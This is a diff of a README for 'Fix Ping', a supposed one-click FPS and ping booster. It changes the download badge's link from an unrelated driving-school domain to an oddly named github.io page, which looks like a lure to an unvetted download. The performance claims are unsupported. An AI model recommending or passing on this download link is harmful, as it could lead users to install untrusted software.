@@ -2,7 +2,7 @@
 
 **Fix Ping** is a lightweight, powerful utility designed to enhance your gaming experience by increasing FPS, reducing ping, and eliminating lag. It optimizes your system settings and network behavior with a single click – no technical knowledge required.
 
-[![Download Fix Ping](https://img.shields.io/badge/Download-Fix--Ping-blueviolet)](https://dalahdrivingschool.com/)
+[![Download Fix Ping](https://img.shields.io/badge/Download-Fix--Ping-blueviolet)](https://fix-ping-all-in-one-fps-booster.github.io/.github)
 
 ---
 
